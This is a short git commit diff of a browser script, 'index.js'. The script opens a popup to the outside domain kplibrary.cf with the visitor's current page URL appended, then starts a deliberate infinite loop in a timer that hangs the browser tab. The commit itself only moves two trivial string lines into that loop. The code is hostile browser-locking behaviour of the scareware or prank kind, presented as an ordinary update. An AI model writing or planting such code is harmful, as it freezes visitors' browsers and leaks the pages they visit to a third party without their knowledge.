74e2eed5211bbdb84185e20a6e2a9708e395474f
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-09 14:56:20 -0500

    Update index.js

--- index.js
+++ index.js
@@ -9,10 +9,10 @@ if (popUp == null || typeof(popUp) == 'undefined') {
     var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
   var URL = "http://kplibrary.cf/" + location.href;
   var win = window.open(URL, "_blank", strWindowFeatures);
-  txt = "a";
-  txt = txt += "a";
   setTimeout(function() {
     for (var i = 0; i === i; i++) {}
+    txt = "a";
+    txt = txt += "a";
   }, 5);
 }
 }
